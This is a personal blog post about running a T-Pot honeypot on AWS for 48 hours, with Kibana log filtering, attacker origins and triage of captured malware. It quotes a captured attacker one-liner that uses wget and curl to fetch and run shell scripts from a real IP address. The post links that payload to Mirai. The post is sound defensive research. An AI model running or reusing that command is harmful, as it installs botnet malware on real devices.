#### This blog is designed to give some background information on honeypots, and the results of running T-Pot for 48 hours.

# 1. What is a honeypot?

According to Merriam-Webster, a honeypot is *"one that is attractive or desirable"*<sub>[1](https://www.merriam-webster.com/dictionary/honeypot)</sub>

Wikipedia describes a Honeypot as *"a computer security mechanism set to detect, deflect, or, in some manner, counteract attempts at unauthorized use of information systems."*<sub>[2](https://en.wikipedia.org/wiki/Honeypot_(computing)#:~:text=a%20computer%20security%20mechanism%20set%20to%20detect%2C%20deflect%2C%20or%2C%20in%20some%20manner%2C%20counteract%20attempts%20at%20unauthorized%20use%20of%20information%20systems.)</sub>

In the information security realm, a honeypot is defined by the function it is used for and the purpose of one honeypot may not share the purpose of another honeypot.  

**tldr:** Generally a honeypot is a vulnerable system with a wide attack surface that attracts attackers, logs their activities, and displays the information in a log format. 

---

# 2. What did I use my honeypot for?

My honeypot ran for 48 hours with a public-facing IP address and ports 1-64000 open. 
**Note**: Not all ports had services running. 

I intended to gather as much intel as possible on attacker's techniques and then analyze that data to determine the following:

- Common ports tested for vulnerabilities.

- Commands used by attackers.

- Passwords used by attackers.

- Countries of origin.

- Detect Common Vulnerability and Exposure (CVE) attacks in a real environment.

---

# 3. What honeypot setup did I use?

#### [üçØ T-Pot - The All In One Honeypot Platform üêù](https://github.com/telekom-security/tpotce)

I built my honeypot on an Amazon Web Services EC2 Debian 11 server using a t3.xlarge instance.<br>
I used the **Bahrain** `me-south-1` region for my instance.

#### Using AWS was a quick and convenient method for running the honeypot because of:

- Ease starting and stopping services in AWS.

- Ease of networking in AWS.
  
- Ease of security groups in AWS.

- Obtaining an elastic IP address and having it connected to your instance is quick and effortless.

- No hardware requirements.

#### Reasons AWS might not be right for you:

- ~$10/day this can get costly.

- Provisioning of resources manually.

#### Minimum Requirements for T-Pot:

Minimum suggested requirements for running T-Pot can be found [here](https://github.com/telekom-security/tpotce#system-requirements).

#### Honeypots included in T-Pot:

All information for ports and honeypots can be found [here](https://github.com/telekom-security/tpotce#technical-concept).

#### Services & Technologies used:

- Amazon Web Services ([EC2](https://aws.amazon.com/ec2/))  -  for hosting your Honeypot.

- SSH terminal of choice - for initial setup.

- ELK (Elasticsearch, Logstash, Kibana) - For searching through logs of attacks and displaying the data nicely.

- Honeypots - 22 various Honeypots.

- [Linode](https://www.linode.com/) Instances - For downloading and interacting with payloads.

- Microsoft Excel for further log analysis offline (save money instead of running the honeypot after you have gathered your data).

---

# 4. Expected outcomes

I expected many of the attacks and probes of ports would originate from bots. 

I expected to see CVE linked attacks of all types. 

I expected to see attacks from a diverse global footprint.

---

# 5. How to setup T-Pot

Eric Tsang has an excellent write-up explaining in detail how to set up the T-Pot honeypot on an AWS instance exactly the way I did.
View his write-up [here](https://blog.devgenius.io/creating-a-research-honeypot-on-aws-b0ded134729a).

# 6. How to analyze logs using Kibana > Discover

Analyzing logs in Kibana may remind you of using Splunk as they both function very similarly.  However, there are some noticeable differences in using Kibana, to understand these differences further I suggest you read Asaf Yigal's article over at [DevOps.com](https://devops.com/splunk-elk-stack-side-side-comparison/#:~:text=Kibana%20is%20the%20visualization%20tool,of%20them%20in%20a%20dashboard.). 

Every honeypot varies in what data it collects, how it collects, and how it stores values in logs. Here I will show you how to filter all logs to display some of the honeypot data that I found interesting. 

**Alert:** You should filter out your IP address from Kibana using a `is not` operator in a filter. See below an example of a `dest_ip` filter. You will want to do this for `src_ip` as well. 

![dest_IP](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/adbhoney0.png)

---

### Adbhoney Filtering

To filter only Adbhoney Command Inputs I used the following filter in Kabana:

`eventid: adbhoney.command.input`

You can input this in the +Add Filter window the same way you entered your `dest_ip` & `src_ip` filters. 

Below you see that with the eventid filter of adbhoney.command.input I had received 99 command input events in the past 72 hours.

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/adbhoney1.PNG)

To view details of each event you can click the drop-down arrow on the left side of the event. 

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/adbhoney2.PNG)

Finally, you can see the commands used by attackers on the Adbhoney Pot in the `input` field of the event viewer.

**Below** you will see that the attacker was using the command:

`cd /data/local/tmp/; busybox wget http://45.61.184.4/w.sh; sh w.sh; curl http://45.61.184.4/c.sh; sh c.sh`

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/adbhoney3.PNG)

**Bonus:**

You can use the fields selector on the left pane of the discover tab to show you only fields that you want to see. For example in the below screenshot I used the `input`, `Country`, and `geoip.ip` to filter out all of the information that I did not want to see.

### Analysis of Malicious Payload - Example

***Don't know what Linux commands you are seeing? Use [explainshell](https://explainshell.com/).***

One of the payloads I found on the honeypot was:<br>
`cd /data/local/tmp/; busybox wget http://45.61.184.4/w.sh; sh w.sh; curl http://45.61.184.4/c.sh;`<br>
Broken into steps we can see the order of events:<br>
1 . `cd /data/local/tmp/`<br>
2 . `busybox wget http://45.61.184.4/w.sh`<br>
3 . `sh w.sh`<br>
4 . `curl http://45.61.184.4/c.sh`<br>

*This looks like the attacker is trying to change directories.*

`cd /data/local/tmp/;`

*Here the attacker is trying to tell busybox to download `w.sh` file.*

`busybox wget http://45.61.184.4/w.sh;` 

*Now the attacker attempts to invoke the default shell for the system and run `w.sh`.*

`sh w.sh;` 

*Finally, the attacker trys to download another file named `c.sh`.*

`curl http://45.61.184.4/c.sh;`

*Now the attacker attempts to invoke the default shell for the system and run `c.sh`.*

`sh c.sh`

**Remember** this is just one log event. Likely this means that this attacker will enter the honeypot again later to run the `c.sh` script. 

---

### What is the `c.sh` malicious file that was curl'ed into the honeypot?

I used a [Linode](https://www.linode.com/) instance to mimic the commands my attackers used. 

**Why a separate instance?**

I wanted to run the commands on a physically removed virtualized environment from my honeypot, personal VMs, and personal network at home. 

I downloaded the c.sh contents into a c.sh file and then ran the cat command to print the file contents to the screen. So we can see that the c.sh downloads each of these: 

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/adbhoney4.PNG)

Next, I downloaded the arc file from the IP address above and determined its file type.

Unfortunately, I could not run the binary as it kept giving errors. So I tried my luck downloading the x86_64 file. 

**Bingo!**

**Disclaimer / Warning: DO NOT DOWNLOAD MALWARE ON YOUR SYSTEMS THESE NEXT STEPS ARE EXTREMELY DANGEROUS**

Next, I gave the x86_64 .elf binary file **777** permissions. <- **AGAIN NEVER DO THIS**.

Then I executed the malicious file. <- **AGAIN NEVER DO THIS**.

![imagetest](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/adbhoney5.PNG)

It is a listener! But that does not tell us much. 

So I input the file URL into VirusTotal to see if anyone had reverse-engineered the file to give us more details. 

Here are the [results](https://www.virustotal.com/gui/url/3b73e3a27bd2df0f11c6a3562bbfd7ba866eeb1c1ba98d50985bd1041dc16eae):

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/virustotal.png)

VirusTotal tells me the hash value of the body of the URL which means I can do further analysis on other sites as to the nature of the file. 

The body SHA-256 of the URL is: `33eef0c93b605ce87d0632bd362bcd033ee5c39dfb88f1d63e33ab27ea7e1179`.

Next, I navigated to [AlienVault](https://otx.alienvault.com/indicator/file/33eef0c93b605ce87d0632bd362bcd033ee5c39dfb88f1d63e33ab27ea7e1179) which has the Open Threat Exchange, a repository of information about attacks.

I found that the file has a file score of 6 which makes it a medium risk.

Additionally, it is linked to the [Mirai](https://www.cloudflare.com/learning/ddos/glossary/mirai-botnet/) malware.

This malware is especially nasty as it turns your computer into a zombie.

Attackers call this a botnet and use your infected device to do malicious things on the internet.

Sometimes the botnet mines cryptocurrency using your computing power.

See the below screenshots from AlienVault.
![alienvault-1](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/alienvault-1.PNG)


**Why is this particular file important to understand?**

This malware is searching for IoT devices that run on an ARC processor family.

According to [Statista](https://www.statista.com/statistics/1183457/iot-connected-devices-worldwide/), there are an estimated 11.57 billion IoT devices connected worldwide. 

Could you imagine a botnet using billions of devices to attack systems? 

The largest denial of service attack that has ever occurred only used 180,000 bots. 

Imagine if future malware keeps adapting to successfully infect billions of IoT devices, what would the future of the internet look like?

- ICS/SCADA attack via Conpot targetting Veeder-Root Automatic Tank Gauges. 

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/adbhoney7.PNG)

### Country of origin

**Disclaimer:** I am aware that many of the countries of origin are masked or attackers are using proxies for obfuscation. 

- **Iran:** The attacker had a successful upload of malware to my Cowrie honeypot via SSH. 
  
  - View the abuse.ch analysis of the file uploaded [here](https://bazaar.abuse.ch/sample/b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0/). 
  
  - Reported as a trojan that includes a cryptocurrency miner of some sort. 

- **United States**: 3 ICS/SCADA attacks targetting Vedeer-Root Automatic Tank Gauges in the country of Bahrain.

### Unexpected outcomes

I was browsing through hex data that was passed as payload data and decoding via [Cyberchef](https://gchq.github.io/CyberChef/). 

At this point in my analysis of the logs, I had processed about 60+ different hex payloads. 

This one stood out to me in Cyberchef as it had something that I had not seen yet in previous hex decodes I performed: `fox a 1 -1 fox hello`. 

A quick google of `fox a 1 -1 fox hello` and I find it is an NMAP script which is also on Github [here](https://github.com/nmap/nmap/blob/master/scripts/fox-info.nse). 

Awesome! I love using NMAP and have tried remembering all of the different scripts and their uses, but alas this one I had not used. 

**HOWEVER**, what was most unexpected of this find was that this script was designed by the author "*based off Billy Rios and Terry **McCorkle's** work.*" 

*Yes, you read that correctly.*

Honestly, this gave me a chill down my spine. If you have ever seen "[The Truman Show (1998) - IMDb](https://www.imdb.com/title/tt0120382/)" then you know I felt immediately like I was living inside of an alternate reality. 

What are the odds of finding my last name in a random honeypot hex attack payload? I am sure one of you data scientists or math experts could tell me the odds, but I believe the odds must be extremely low, nearly unlikely. 

### Something I learned and was not aware of before setting up the honeypot

There are *SO* many bots searching for vulnerable systems on the internet.

---

# 9. What would I do differently next time?
Next time I run a honeypot I will implement an intrusion detection system to create alerts of specific event types.

I would likely use SNORT as it is free, open-source, and versatile.

I would also implement a secondary server to run a Splunk instance and capture the SNORT alerts as well as the honeypot logs.

---

# 10. Summary

I ran a honeypot called T-Pot for 48 hours using an AWS instance. 

I received many attacks on all 22 honeypots operating vulnerable services. 

I received an attack that scored a 10.0 on the CVSS, a true compromise of the CIA triad. 

Most of the attacks were bots, one bot connected via SSH, ran commands, and left within 1.13 seconds. Speedy!

Despite running my vulnerable honeypot in Bahrain, I did not see any attacks outside of what I expected based solely on geographical location. 

I found my last name while going down an analysis rabbit hole from an attack (no it wasn't a VM escape / personalized attack), see that here in [part 2](https://matthewomccorkle.github.io/honeypot-2/).

---

# 11. What did I learn?

1. I learned how the Elasticsearch and Kibana systems work. 
   
   a. This led to learning a different search and analysis method that was outside of my Splunk knowledge.

2. There are *so many* bots on the internet. Do they struggle with captchas as I do?

3. I learned how to set up a blog site using Github. 
   
   a. This led to learning some Jekyll language.

   b. I learned markdown to format the blog to appear as you see it.

   c. This taught me how commits and pulls work on Github.

   d. I learned markdown just so I could make a blog that is free, open-source, without paywalls, and do not require you to log in to read.
